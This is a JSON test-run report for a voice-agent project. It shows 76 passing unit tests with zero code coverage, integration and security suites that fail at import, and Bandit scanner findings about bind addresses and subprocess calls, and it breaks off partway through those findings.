{
  "summary": {
    "total_test_suites": 5,
    "passed": 1,
    "failed": 4,
    "skipped": 0,
    "duration_seconds": 46.45111799240112,
    "timestamp": "2025-06-20 14:24:42"
  },
  "results": {
    "unit": {
      "status": "passed",
      "returncode": 0,
      "stdout": "============================= test session starts ==============================\nplatform linux -- Python 3.12.3, pytest-8.4.1, pluggy-1.6.0 -- /home/pas/source/agent-cag/.venv/bin/python\ncachedir: .pytest_cache\nrootdir: /home/pas/source/agent-cag\nconfigfile: pytest.ini\nplugins: cov-6.2.1, xdist-3.7.0, anyio-4.9.0, asyncio-1.0.0\nasyncio: mode=Mode.STRICT, asyncio_default_fixture_loop_scope=None, asyncio_default_test_loop_scope=function\ncreated: 6/6 workers\n6 workers [76 items]\n\nscheduling tests via LoadScheduling\n\ntests/unit/test_api.py::TestHealthEndpoint::test_health_check_success \ntests/unit/test_api.py::TestSearchEndpoint::test_search_knowledge \ntests/unit/test_asr.py::TestASRErrorHandling::test_audio_quality_validation \ntests/unit/test_asr.py::TestASRPerformance::test_memory_management \ntests/unit/test_asr.py::TestASRService::test_transcribe_endpoint \ntests/unit/test_asr.py::TestWhisperIntegration::test_batch_transcription \n[gw4] [  1%] PASSED tests/unit/test_asr.py::TestASRErrorHandling::test_audio_quality_validation \n[gw5] [  2%] PASSED tests/unit/test_asr.py::TestASRPerformance::test_memory_management \ntests/unit/test_asr.py::TestASRPerformance::test_model_optimization \ntests/unit/test_asr.py::TestASRConfiguration::test_language_detection \n[gw4] [  3%] PASSED tests/unit/test_asr.py::TestASRPerformance::test_model_optimization \n[gw3] [  5%] PASSED tests/unit/test_asr.py::TestWhisperIntegration::test_batch_transcription \n[gw5] [  6%] PASSED tests/unit/test_asr.py::TestASRConfiguration::test_language_detection \ntests/unit/test_asr.py::TestASRPerformance::test_streaming_transcription \ntests/unit/test_asr.py::TestASRErrorHandling::test_invalid_audio_format \ntests/unit/test_asr.py::TestASRConfiguration::test_model_configuration \n[gw5] [  7%] PASSED tests/unit/test_asr.py::TestASRConfiguration::test_model_configuration \ntests/unit/test_database.py::TestDatabaseManager::test_async_operations \n[gw4] [  9%] PASSED tests/unit/test_asr.py::TestASRPerformance::test_streaming_transcription \n[gw3] [ 10%] PASSED tests/unit/test_asr.py::TestASRErrorHandling::test_invalid_audio_format \ntests/unit/test_asr.py::TestASRConfiguration::test_output_formatting \ntests/unit/test_asr.py::TestASRErrorHandling::test_transcription_failure \n[gw4] [ 11%] PASSED tests/unit/test_asr.py::TestASRConfiguration::test_output_formatting \ntests/unit/test_database.py::TestDatabaseManager::test_manager_creation \n[gw5] [ 13%] PASSED tests/unit/test_database.py::TestDatabaseManager::test_async_operations \n[gw4] [ 14%] PASSED tests/unit/test_database.py::TestDatabaseManager::test_manager_creation \ntests/unit/test_database.py::TestDuckDBBackend::test_duckdb_connection_pattern \n[gw3] [ 15%] PASSED tests/unit/test_asr.py::TestASRErrorHandling::test_transcription_failure \n[gw0] [ 17%] PASSED tests/unit/test_api.py::TestHealthEndpoint::test_health_check_success \n[gw1] [ 18%] PASSED tests/unit/test_api.py::TestSearchEndpoint::test_search_knowledge \ntests/unit/test_database.py::TestDatabaseManager::test_manager_profile_validation \ntests/unit/test_api.py::TestHistoryEndpoint::test_get_user_history \n[gw4] [ 19%] PASSED tests/unit/test_database.py::TestDatabaseManager::test_manager_profile_validation \ntests/unit/test_database.py::TestDuckDBBackend::test_duckdb_table_schemas \ntests/unit/test_api.py::TestQueryEndpoint::test_process_query_success \ntests/unit/test_database.py::TestFullStackBackend::test_fullstack_vector_operations \n[gw3] [ 21%] PASSED tests/unit/test_database.py::TestDuckDBBackend::test_duckdb_table_schemas \ntests/unit/test_database.py::TestFullStackBackend::test_fullstack_components \n[gw5] [ 22%] PASSED tests/unit/test_database.py::TestDuckDBBackend::test_duckdb_connection_pattern \n[gw4] [ 23%] PASSED tests/unit/test_database.py::TestFullStackBackend::test_fullstack_vector_operations \ntests/unit/test_database.py::TestDatabaseErrorHandling::test_connection_error_handling \n[gw2] [ 25%] PASSED tests/unit/test_asr.py::TestASRService::test_transcribe_endpoint \ntests/unit/test_asr.py::TestWhisperIntegration::test_whisper_model_loading \n[gw2] [ 26%] PASSED tests/unit/test_asr.py::TestWhisperIntegration::test_whisper_model_loading \n[gw0] [ 27%] PASSED tests/unit/test_api.py::TestQueryEndpoint::test_process_query_success \n[gw3] [ 28%] PASSED tests/unit/test_database.py::TestFullStackBackend::test_fullstack_components \n[gw1] [ 30%] PASSED tests/unit/test_api.py::TestHistoryEndpoint::test_get_user_history \n[gw4] [ 31%] PASSED tests/unit/test_database.py::TestDatabaseErrorHandling::test_connection_error_handling \ntests/unit/test_database.py::TestDuckDBBackend::test_duckdb_query_operations \ntests/unit/test_api.py::TestQueryEndpoint::test_process_query_invalid_input \ntests/unit/test_asr.py::TestWhisperIntegration::test_audio_preprocessing \ntests/unit/test_database.py::TestFullStackBackend::test_fullstack_graph_operations \ntests/unit/test_asr.py::TestASRService::test_health_check \ntests/unit/test_database.py::TestDatabaseErrorHandling::test_query_error_handling \n[gw2] [ 32%] PASSED tests/unit/test_asr.py::TestWhisperIntegration::test_audio_preprocessing \n[gw5] [ 34%] PASSED tests/unit/test_database.py::TestDuckDBBackend::test_duckdb_query_operations \ntests/unit/test_database.py::TestDatabaseErrorHandling::test_validation_error_handling \n[gw3] [ 35%] PASSED tests/unit/test_database.py::TestFullStackBackend::test_fullstack_graph_operations \n[gw4] [ 36%] PASSED tests/unit/test_database.py::TestDatabaseErrorHandling::test_query_error_handling \n[gw1] [ 38%] PASSED tests/unit/test_asr.py::TestASRService::test_health_check \ntests/unit/test_llm.py::TestLLMService::test_health_check \ntests/unit/test_llm.py::TestOllamaIntegration::test_streaming_generation \n[gw0] [ 39%] PASSED tests/unit/test_api.py::TestQueryEndpoint::test_process_query_invalid_input \n[gw2] [ 40%] PASSED tests/unit/test_database.py::TestDatabaseErrorHandling::test_validation_error_handling \ntests/unit/test_llm.py::TestOllamaIntegration::test_ollama_client \ntests/unit/test_database.py::TestDatabasePerformance::test_connection_pooling_patterns \ntests/unit/test_database.py::TestDatabaseConcurrency::test_transaction_patterns \ntests/unit/test_database.py::TestDatabaseConcurrency::test_concurrent_operations \n[gw4] [ 42%] PASSED tests/unit/test_llm.py::TestOllamaIntegration::test_streaming_generation \n[gw1] [ 43%] PASSED tests/unit/test_llm.py::TestOllamaIntegration::test_ollama_client \n[gw5] [ 44%] PASSED tests/unit/test_database.py::TestDatabaseConcurrency::test_transaction_patterns \ntests/unit/test_llm.py::TestLLMErrorHandling::test_model_not_found \ntests/unit/test_llm.py::TestOllamaIntegration::test_model_management \n[gw2] [ 46%] PASSED tests/unit/test_database.py::TestDatabaseConcurrency::test_concurrent_operations \n[gw0] [ 47%] PASSED tests/unit/test_database.py::TestDatabasePerformance::test_connection_pooling_patterns \ntests/unit/test_database.py::TestDatabasePerformance::test_batch_operation_patterns \n[gw4] [ 48%] PASSED tests/unit/test_llm.py::TestLLMErrorHandling::test_model_not_found \n[gw5] [ 50%] PASSED tests/unit/test_database.py::TestDatabasePerformance::test_batch_operation_patterns \ntests/unit/test_llm.py::TestLLMErrorHandling::test_generation_timeout \n[gw1] [ 51%] PASSED tests/unit/test_llm.py::TestOllamaIntegration::test_model_management \ntests/unit/test_llm.py::TestLLMErrorHandling::test_prompt_validation \ntests/unit/test_database.py::TestDatabasePerformance::test_query_optimization_patterns \n[gw0] [ 52%] PASSED tests/unit/test_database.py::TestDatabasePerformance::test_query_optimization_patterns \n[gw4] [ 53%] PASSED tests/unit/test_llm.py::TestLLMErrorHandling::test_prompt_validation \ntests/unit/test_llm.py::TestLLMPerformance::test_batch_processing \ntests/unit/test_llm.py::TestLLMPerformance::test_token_management \ntests/unit/test_llm.py::TestLLMConfiguration::test_model_configuration \n[gw1] [ 55%] PASSED tests/unit/test_llm.py::TestLLMPerformance::test_token_management \ntests/unit/test_llm.py::TestLLMConfiguration::test_generation_parameters \n[gw4] [ 56%] PASSED tests/unit/test_llm.py::TestLLMConfiguration::test_model_configuration \n[gw2] [ 57%] PASSED tests/unit/test_llm.py::TestLLMErrorHandling::test_generation_timeout \ntests/unit/test_llm.py::TestLLMIntegration::test_context_management \n[gw5] [ 59%] PASSED tests/unit/test_llm.py::TestLLMPerformance::test_batch_processing \ntests/unit/test_llm.py::TestLLMIntegration::test_response_formatting \n[gw0] [ 60%] PASSED tests/unit/test_llm.py::TestLLMConfiguration::test_generation_parameters \ntests/unit/test_llm.py::TestLLMPerformance::test_memory_optimization \n[gw2] [ 61%] PASSED tests/unit/test_llm.py::TestLLMPerformance::test_memory_optimization \n[gw3] [ 63%] PASSED tests/unit/test_llm.py::TestLLMService::test_health_check \n[gw4] [ 64%] PASSED tests/unit/test_llm.py::TestLLMIntegration::test_response_formatting \ntests/unit/test_llm.py::TestLLMIntegration::test_safety_filtering \ntests/unit/test_llm.py::TestLLMConfiguration::test_prompt_templates \n[gw1] [ 65%] PASSED tests/unit/test_llm.py::TestLLMIntegration::test_context_management \ntests/unit/test_llm.py::TestLLMService::test_generate_endpoint \ntests/unit/test_tts.py::TestTTSService::test_synthesize_endpoint \n[gw0] [ 67%] PASSED tests/unit/test_llm.py::TestLLMIntegration::test_safety_filtering \ntests/unit/test_tts.py::TestTTSService::test_health_check \n[gw5] [ 68%] PASSED tests/unit/test_llm.py::TestLLMConfiguration::test_prompt_templates \ntests/unit/test_tts.py::TestPiperIntegration::test_voice_loading \ntests/unit/test_tts.py::TestTTSService::test_voices_endpoint \ntests/unit/test_tts.py::TestPiperIntegration::test_piper_synthesis \n[gw3] [ 69%] PASSED tests/unit/test_llm.py::TestLLMService::test_generate_endpoint \n[gw0] [ 71%] PASSED tests/unit/test_tts.py::TestPiperIntegration::test_voice_loading \n[gw1] [ 72%] PASSED tests/unit/test_tts.py::TestTTSService::test_health_check \ntests/unit/test_tts.py::TestTTSErrorHandling::test_empty_text_handling \ntests/unit/test_tts.py::TestPiperIntegration::test_audio_processing \n[gw5] [ 73%] PASSED tests/unit/test_tts.py::TestPiperIntegration::test_piper_synthesis \n[gw0] [ 75%] PASSED tests/unit/test_tts.py::TestTTSErrorHandling::test_empty_text_handling \n[gw2] [ 76%] PASSED tests/unit/test_tts.py::TestTTSService::test_voices_endpoint \ntests/unit/test_tts.py::TestTTSErrorHandling::test_synthesis_failure \n[gw3] [ 77%] PASSED tests/unit/test_tts.py::TestPiperIntegration::test_audio_processing \ntests/unit/test_tts.py::TestTTSPerformance::test_memory_usage \ntests/unit/test_tts.py::TestTTSPerformance::test_synthesis_speed \n[gw5] [ 78%] PASSED tests/unit/test_tts.py::TestTTSPerformance::test_synthesis_speed \n[gw0] [ 80%] PASSED tests/unit/test_tts.py::TestTTSPerformance::test_memory_usage \ntests/unit/test_tts.py::TestTTSConfiguration::test_voice_settings \n[gw1] [ 81%] PASSED tests/unit/test_tts.py::TestTTSErrorHandling::test_synthesis_failure \ntests/unit/test_tts.py::TestTTSErrorHandling::test_text_validation \ntests/unit/test_tts.py::TestTTSConfiguration::test_synthesis_options \n[gw5] [ 82%] PASSED tests/unit/test_tts.py::TestTTSConfiguration::test_voice_settings \n[gw2] [ 84%] PASSED tests/unit/test_tts.py::TestTTSErrorHandling::test_text_validation \ntests/unit/test_tts.py::TestTTSPerformance::test_batch_synthesis \n[gw0] [ 85%] PASSED tests/unit/test_tts.py::TestTTSConfiguration::test_synthesis_options \ntests/unit/test_tts.py::TestTTSConfiguration::test_audio_settings \n[gw1] [ 86%] PASSED tests/unit/test_tts.py::TestTTSConfiguration::test_audio_settings \n[gw3] [ 88%] PASSED tests/unit/test_tts.py::TestTTSPerformance::test_batch_synthesis \ntests/unit/test_tts.py::TestTTSIntegration::test_ssml_support \ntests/unit/test_tts.py::TestTTSIntegration::test_multilingual_support \ntests/unit/test_tts.py::TestTTSIntegration::test_streaming_synthesis \ntests/unit/test_tts.py::TestTTSIntegration::test_phoneme_support \n[gw4] [ 89%] PASSED tests/unit/test_tts.py::TestTTSService::test_synthesize_endpoint \ntests/unit/test_tts.py::TestTTSQuality::test_prosody_control \n[gw0] [ 90%] PASSED tests/unit/test_tts.py::TestTTSIntegration::test_multilingual_support \n[gw2] [ 92%] PASSED tests/unit/test_tts.py::TestTTSIntegration::test_ssml_support \n[gw3] [ 93%] PASSED tests/unit/test_tts.py::TestTTSIntegration::test_phoneme_support \n[gw1] [ 94%] PASSED tests/unit/test_tts.py::TestTTSQuality::test_prosody_control \ntests/unit/test_tts.py::TestTTSErrorHandling::test_voice_not_found \n[gw5] [ 96%] PASSED tests/unit/test_tts.py::TestTTSIntegration::test_streaming_synthesis \ntests/unit/test_tts.py::TestTTSQuality::test_emotion_control \n[gw4] [ 97%] PASSED tests/unit/test_tts.py::TestTTSErrorHandling::test_voice_not_found \n[gw2] [ 98%] PASSED tests/unit/test_tts.py::TestTTSQuality::test_emotion_control \ntests/unit/test_tts.py::TestTTSQuality::test_voice_cloning \n[gw5] [100%] PASSED tests/unit/test_tts.py::TestTTSQuality::test_voice_cloning \n\n================================ tests coverage ================================\n_______________ coverage: platform linux, python 3.12.3-final-0 ________________\n\nName              Stmts   Miss   Cover   Missing\n------------------------------------------------\napi/__init__.py       0      0 100.00%\napi/database.py     157    157   0.00%   7-445\napi/main.py         116    116   0.00%   8-237\napi/models.py        57     57   0.00%   5-94\nasr/__init__.py       0      0 100.00%\nasr/main.py         114    114   0.00%   7-231\nllm/__init__.py       0      0 100.00%\nllm/main.py         152    152   0.00%   7-314\ntts/__init__.py       0      0 100.00%\ntts/main.py         145    145   0.00%   7-294\n------------------------------------------------\nTOTAL               741    741   0.00%\nCoverage HTML written to dir htmlcov\n============================== 76 passed in 3.36s ==============================\n",
      "stderr": "/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages/coverage/control.py:915: CoverageWarning: No data was collected. (no-data-collected)\n  self._warn(\"No data was collected.\", slug=\"no-data-collected\")\n/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages/coverage/control.py:915: CoverageWarning: No data was collected. (no-data-collected)\n  self._warn(\"No data was collected.\", slug=\"no-data-collected\")\n/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages/coverage/control.py:915: CoverageWarning: No data was collected. (no-data-collected)\n  self._warn(\"No data was collected.\", slug=\"no-data-collected\")\n/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages/coverage/control.py:915: CoverageWarning: No data was collected. (no-data-collected)\n  self._warn(\"No data was collected.\", slug=\"no-data-collected\")\n/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages/coverage/control.py:915: CoverageWarning: No data was collected. (no-data-collected)\n  self._warn(\"No data was collected.\", slug=\"no-data-collected\")\n/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages/coverage/control.py:915: CoverageWarning: No data was collected. (no-data-collected)\n  self._warn(\"No data was collected.\", slug=\"no-data-collected\")\n",
      "duration": 0
    },
    "integration": {
      "status": "failed",
      "returncode": 2,
      "stdout": "============================= test session starts ==============================\nplatform linux -- Python 3.12.3, pytest-8.4.1, pluggy-1.6.0 -- /home/pas/source/agent-cag/.venv/bin/python\ncachedir: .pytest_cache\nrootdir: /home/pas/source/agent-cag\nconfigfile: pytest.ini\nplugins: cov-6.2.1, xdist-3.7.0, anyio-4.9.0, asyncio-1.0.0\nasyncio: mode=Mode.STRICT, asyncio_default_fixture_loop_scope=None, asyncio_default_test_loop_scope=function\ncollecting ... collected 9 items / 1 error\n\n==================================== ERRORS ====================================\n_______ ERROR collecting tests/integration/test_enhanced_integration.py ________\ntests/integration/test_enhanced_integration.py:15: in <module>\n    with patch('httpx.AsyncClient'), \\\n/usr/lib/python3.12/unittest/mock.py:1442: in __enter__\n    self.target = self.getter()\n                  ^^^^^^^^^^^^^\n/usr/lib/python3.12/pkgutil.py:528: in resolve_name\n    result = getattr(result, p)\n             ^^^^^^^^^^^^^^^^^^\nE   AttributeError: module 'api' has no attribute 'database'\n=========================== short test summary info ============================\nERROR tests/integration/test_enhanced_integration.py - AttributeError: module...\n!!!!!!!!!!!!!!!!!!!! Interrupted: 1 error during collection !!!!!!!!!!!!!!!!!!!!\n=============================== 1 error in 0.24s ===============================\n",
      "stderr": "",
      "duration": 0
    },
    "security": {
      "status": "failed",
      "returncode": 2,
      "stdout": "============================= test session starts ==============================\nplatform linux -- Python 3.12.3, pytest-8.4.1, pluggy-1.6.0 -- /home/pas/source/agent-cag/.venv/bin/python\ncachedir: .pytest_cache\nrootdir: /home/pas/source/agent-cag\nconfigfile: pytest.ini\nplugins: cov-6.2.1, xdist-3.7.0, anyio-4.9.0, asyncio-1.0.0\nasyncio: mode=Mode.STRICT, asyncio_default_fixture_loop_scope=None, asyncio_default_test_loop_scope=function\ncollecting ... collected 0 items / 1 error\n\n==================================== ERRORS ====================================\n_______________ ERROR collecting tests/security/test_security.py _______________\ntests/security/test_security.py:13: in <module>\n    with patch('api.main.httpx'), \\\n/usr/lib/python3.12/unittest/mock.py:1442: in __enter__\n    self.target = self.getter()\n                  ^^^^^^^^^^^^^\n/usr/lib/python3.12/pkgutil.py:528: in resolve_name\n    result = getattr(result, p)\n             ^^^^^^^^^^^^^^^^^^\nE   AttributeError: module 'api' has no attribute 'main'\n=========================== short test summary info ============================\nERROR tests/security/test_security.py - AttributeError: module 'api' has no a...\n!!!!!!!!!!!!!!!!!!!! Interrupted: 1 error during collection !!!!!!!!!!!!!!!!!!!!\n=============================== 1 error in 0.51s ===============================\n",
      "stderr": "",
      "bandit_output": "{\n  \"errors\": [],\n  \"generated_at\": \"2025-06-20T19:24:28Z\",\n  \"metrics\": {\n    \"_totals\": {\n      \"CONFIDENCE.HIGH\": 6,\n      \"CONFIDENCE.LOW\": 0,\n      \"CONFIDENCE.MEDIUM\": 4,\n      \"CONFIDENCE.UNDEFINED\": 0,\n      \"SEVERITY.HIGH\": 0,\n      \"SEVERITY.LOW\": 6,\n      \"SEVERITY.MEDIUM\": 4,\n      \"SEVERITY.UNDEFINED\": 0,\n      \"loc\": 1225,\n      \"nosec\": 0,\n      \"skipped_tests\": 0\n    },\n    \"api/__init__.py\": {\n      \"CONFIDENCE.HIGH\": 0,\n      \"CONFIDENCE.LOW\": 0,\n      \"CONFIDENCE.MEDIUM\": 0,\n      \"CONFIDENCE.UNDEFINED\": 0,\n      \"SEVERITY.HIGH\": 0,\n      \"SEVERITY.LOW\": 0,\n      \"SEVERITY.MEDIUM\": 0,\n      \"SEVERITY.UNDEFINED\": 0,\n      \"loc\": 1,\n      \"nosec\": 0,\n      \"skipped_tests\": 0\n    },\n    \"api/database.py\": {\n      \"CONFIDENCE.HIGH\": 1,\n      \"CONFIDENCE.LOW\": 0,\n      \"CONFIDENCE.MEDIUM\": 0,\n      \"CONFIDENCE.UNDEFINED\": 0,\n      \"SEVERITY.HIGH\": 0,\n      \"SEVERITY.LOW\": 1,\n      \"SEVERITY.MEDIUM\": 0,\n      \"SEVERITY.UNDEFINED\": 0,\n      \"loc\": 338,\n      \"nosec\": 0,\n      \"skipped_tests\": 0\n    },\n    \"api/main.py\": {\n      \"CONFIDENCE.HIGH\": 0,\n      \"CONFIDENCE.LOW\": 0,\n      \"CONFIDENCE.MEDIUM\": 1,\n      \"CONFIDENCE.UNDEFINED\": 0,\n      \"SEVERITY.HIGH\": 0,\n      \"SEVERITY.LOW\": 0,\n      \"SEVERITY.MEDIUM\": 1,\n      \"SEVERITY.UNDEFINED\": 0,\n      \"loc\": 182,\n      \"nosec\": 0,\n      \"skipped_tests\": 0\n    },\n    \"api/models.py\": {\n      \"CONFIDENCE.HIGH\": 0,\n      \"CONFIDENCE.LOW\": 0,\n      \"CONFIDENCE.MEDIUM\": 0,\n      \"CONFIDENCE.UNDEFINED\": 0,\n      \"SEVERITY.HIGH\": 0,\n      \"SEVERITY.LOW\": 0,\n      \"SEVERITY.MEDIUM\": 0,\n      \"SEVERITY.UNDEFINED\": 0,\n      \"loc\": 71,\n      \"nosec\": 0,\n      \"skipped_tests\": 0\n    },\n    \"asr/__init__.py\": {\n      \"CONFIDENCE.HIGH\": 0,\n      \"CONFIDENCE.LOW\": 0,\n      \"CONFIDENCE.MEDIUM\": 0,\n      \"CONFIDENCE.UNDEFINED\": 0,\n      \"SEVERITY.HIGH\": 0,\n      \"SEVERITY.LOW\": 0,\n      \"SEVERITY.MEDIUM\": 0,\n      \"SEVERITY.UNDEFINED\": 0,\n      \"loc\": 1,\n      \"nosec\": 0,\n      \"skipped_tests\": 0\n    },\n    \"asr/main.py\": {\n      \"CONFIDENCE.HIGH\": 0,\n      \"CONFIDENCE.LOW\": 0,\n      \"CONFIDENCE.MEDIUM\": 1,\n      \"CONFIDENCE.UNDEFINED\": 0,\n      \"SEVERITY.HIGH\": 0,\n      \"SEVERITY.LOW\": 0,\n      \"SEVERITY.MEDIUM\": 1,\n      \"SEVERITY.UNDEFINED\": 0,\n      \"loc\": 169,\n      \"nosec\": 0,\n      \"skipped_tests\": 0\n    },\n    \"llm/__init__.py\": {\n      \"CONFIDENCE.HIGH\": 0,\n      \"CONFIDENCE.LOW\": 0,\n      \"CONFIDENCE.MEDIUM\": 0,\n      \"CONFIDENCE.UNDEFINED\": 0,\n      \"SEVERITY.HIGH\": 0,\n      \"SEVERITY.LOW\": 0,\n      \"SEVERITY.MEDIUM\": 0,\n      \"SEVERITY.UNDEFINED\": 0,\n      \"loc\": 1,\n      \"nosec\": 0,\n      \"skipped_tests\": 0\n    },\n    \"llm/main.py\": {\n      \"CONFIDENCE.HIGH\": 3,\n      \"CONFIDENCE.LOW\": 0,\n      \"CONFIDENCE.MEDIUM\": 1,\n      \"CONFIDENCE.UNDEFINED\": 0,\n      \"SEVERITY.HIGH\": 0,\n      \"SEVERITY.LOW\": 3,\n      \"SEVERITY.MEDIUM\": 1,\n      \"SEVERITY.UNDEFINED\": 0,\n      \"loc\": 239,\n      \"nosec\": 0,\n      \"skipped_tests\": 0\n    },\n    \"tts/__init__.py\": {\n      \"CONFIDENCE.HIGH\": 0,\n      \"CONFIDENCE.LOW\": 0,\n      \"CONFIDENCE.MEDIUM\": 0,\n      \"CONFIDENCE.UNDEFINED\": 0,\n      \"SEVERITY.HIGH\": 0,\n      \"SEVERITY.LOW\": 0,\n      \"SEVERITY.MEDIUM\": 0,\n      \"SEVERITY.UNDEFINED\": 0,\n      \"loc\": 1,\n      \"nosec\": 0,\n      \"skipped_tests\": 0\n    },\n    \"tts/main.py\": {\n      \"CONFIDENCE.HIGH\": 2,\n      \"CONFIDENCE.LOW\": 0,\n      \"CONFIDENCE.MEDIUM\": 1,\n      \"CONFIDENCE.UNDEFINED\": 0,\n      \"SEVERITY.HIGH\": 0,\n      \"SEVERITY.LOW\": 2,\n      \"SEVERITY.MEDIUM\": 1,\n      \"SEVERITY.UNDEFINED\": 0,\n      \"loc\": 222,\n      \"nosec\": 0,\n      \"skipped_tests\": 0\n    }\n  },\n  \"results\": [\n    {\n      \"code\": \"294             self.chroma_client.create_collection(\\\"agent_embeddings\\\")\\n295         except Exception:\\n296             # Collection might already exist\\n297             pass\\n298         \\n\",\n      \"col_offset\": 8,\n      \"end_col_offset\": 16,\n      \"filename\": \"api/database.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_cwe\": {\n        \"id\": 703,\n        \"link\": \"https://cwe.mitre.org/data/definitions/703.html\"\n      },\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Try, Except, Pass detected.\",\n      \"line_number\": 295,\n      \"line_range\": [\n        295,\n        296,\n        297\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/1.8.5/plugins/b110_try_except_pass.html\",\n      \"test_id\": \"B110\",\n      \"test_name\": \"try_except_pass\"\n    },\n    {\n      \"code\": \"246         \\\"main:app\\\",\\n247         host=\\\"0.0.0.0\\\",\\n248         port=8000,\\n\",\n      \"col_offset\": 13,\n      \"end_col_offset\": 22,\n      \"filename\": \"api/main.py\",\n      \"issue_confidence\": \"MEDIUM\",\n      \"issue_cwe\": {\n        \"id\": 605,\n        \"link\": \"https://cwe.mitre.org/data/definitions/605.html\"\n      },\n      \"issue_severity\": \"MEDIUM\",\n      \"issue_text\": \"Possible binding to all interfaces.\",\n      \"line_number\": 247,\n      \"line_range\": [\n        247\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/1.8.5/plugins/b104_hardcoded_bind_all_interfaces.html\",\n      \"test_id\": \"B104\",\n      \"test_name\": \"hardcoded_bind_all_interfaces\"\n    },\n    {\n      \"code\": \"240         \\\"main:app\\\",\\n241         host=\\\"0.0.0.0\\\",\\n242         port=8001,\\n\",\n      \"col_offset\": 13,\n      \"end_col_offset\": 22,\n      \"filename\": \"asr/main.py\",\n      \"issue_confidence\": \"MEDIUM\",\n      \"issue_cwe\": {\n        \"id\": 605,\n        \"link\": \"https://cwe.mitre.org/data/definitions/605.html\"\n      },\n      \"issue_severity\": \"MEDIUM\",\n      \"issue_text\": \"Possible binding to all interfaces.\",\n      \"line_number\": 241,\n      \"line_range\": [\n        241\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/1.8.5/plugins/b104_hardcoded_bind_all_interfaces.html\",\n      \"test_id\": \"B104\",\n      \"test_name\": \"hardcoded_bind_all_interfaces\"\n    },\n    {\n      \"code\": \"9 import socket\\n10 import subprocess\\n11 from typing import Dict, Any, Optional\\n\",\n      \"col_offset\": 0,\n      \"end_col_offset\": 17,\n      \"filename\": \"llm/main.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_cwe\": {\n        \"id\": 78,\n        \"link\": \"https://cwe.mitre.org/data/definitions/78.html\"\n      },\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Consider possible security implications associated with the subprocess module.\",\n      \"line_number\": 10,\n      \"line_range\": [\n        10\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/1.8.5/blacklists/blacklist_imports.html#b404-import-subprocess\",\n      \"test_id\": \"B404\",\n      \"test_name\": \"blacklist\"\n    },\n    {\n      \"code\": \"55         # Try to get the default gateway IP from the container\\n56         result = subprocess.run(['ip', 'route', 'show', 'default'],\\n57                               capture_output=True, text=True, timeout=5)\\n58         if result.returncode == 0:\\n\",\n      \"col_offset\": 17,\n      \"end_col_offset\": 72,\n      \"filename\": \"llm/main.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_cwe\": {\n        \"id\": 78,\n        \"link\": \"https://cwe.mitre.org/data/definitions/78.html\"\n      },\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Starting a process with a partial executable path\",\n      \"line_number\": 56,\n      \"line_range\": [\n        56,\n        57\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/1.8.5/plugins/b607_start_process_with_partial_path.html\",\n      \"test_id\": \"B607\",\n      \"test_name\": \"start_process_with_partial_path\"\n    },\n    {\n      \"code\": \"55         # Try to get the default gateway IP from the container\\n56         result = subprocess.run(['ip', 'route', 'show', 'default'],\\n57                               capture_output=True, text=True, timeout=5)\\n58         if result.returncode == 0:\\n\",\n      \"col_offset\": 17,\n      \"end_col_offset\": 72,\n      \"filename\": \"llm/main.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_cwe\": {\n        \"id\": 78,\n        \"link\": \"https://cwe.mitre.org/data/definitions/78.html\"\n      },\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"subprocess call - check for execution of untrusted input.\",\n      \"line_number\": 56,\n      \"line_range\": [\n        56,\n        57\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/1.8.5/plugins/b603_subprocess_without_shell_equals_true.html\",\n      \"test_id\": \"B603\",\n      \"test_name\": \"subprocess_without_shell_equals_true\"\n    },\n    {\n      \"code\": \"322         \\\"main:app\\\",\\n323         host=\\\"0.0.0.0\\\",\\n324         port=8002,\\n\",\n      \"col_offset\": 13,\n      \"end_col_offset\": 22,\n      \"filename\": \"llm/main.py\",\n      \"issue_confidence\": \"MEDIUM\",\n      \"issue_cwe\": {\n        \"id\": 605,\n        \"link\": \"https://cwe.mitre.org/data/definitions/605.html\"\n      },\n      \"issue_severity\": \"MEDIUM\",\n      \"issue_text\": \"Possible binding to all interfaces.\",\n      \"line_number\": 323,\n      \"line_range\": [\n        323\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/1.8.5/plugins/b104_hardcoded_bind_all_interfaces.html\",\n      \"test_id\": \"B104\",\n      \"test_name\": \"hardcoded_bind_all_interfaces\"\n    },\n    {\n      \"code\": \"18 from prometheus_client import start_http_server\\n19 import subprocess\\n20 import soundfile as sf\\n\",\n      \"col_offset\": 0,\n      \"end_col_offset\": 17,\n      \"filename\": \"tts/main.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_cwe\": {\n        \"id\": 78,\n        \"link\": \"https://cwe.mitre.org/data/definitions/78.html\"\n      },\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Consider possible security implications associated with the subprocess module.\",\n      \"line_number\": 19,\n      \"line_range\": [\n        19\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/1.8.5/blacklists/blacklist_imports.html#b404-import-subprocess\",\n      \"test_id\": \"B404\",\n      \"test_name\": \"blacklist\"\n    },\n    {\n      \"code\": \"239         \\n240         result = subprocess.run(cmd, capture_output=True, text=True, check=True)\\n241         \\n\",\n      \"col_offset\": 17,\n      \"end_col_offset\": 80,\n      \"filename\": \"tts/main.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_cwe\": {\n        \"id\": 78,\n        \"link\": \"https://cwe.mitre.org/data/definitions/78.html\"\n      },\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"subprocess call - check for execution of untrusted input.\",\n      \"line_number\": 240,\n      \"line_range\": [\n        240\n      